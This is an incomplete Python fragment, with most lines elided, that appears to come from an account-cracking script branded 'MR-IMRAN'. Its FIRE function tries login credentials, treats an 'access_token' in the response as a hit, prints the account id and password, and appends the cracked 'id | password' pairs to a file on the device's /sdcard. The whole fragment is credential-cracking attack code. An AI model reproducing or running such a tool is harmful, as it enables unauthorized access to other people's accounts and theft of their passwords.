...
def FIRE(ids,pwv,tl):
	...
	"Content-Length": str(len(content_lenght))}
            ...
            if 'access_token' in po:
                ...
                print(f'\r  \033[1;91m[\033[1;92mMR\033[1;91m-\033[1;92mIMRAN\033[1;91m-\033[1;92mOKS\033[1;91m]\033[1;92m '+ids+'\033[1;91m-\033[1;92m'+pas+'\033[1;92m')
                oks.append(ids)
                open('/sdcard/IMRAN-OKS.txt','a').write(ids+' | '+pas+'\n')
                break
            else:continue
        loop+=1
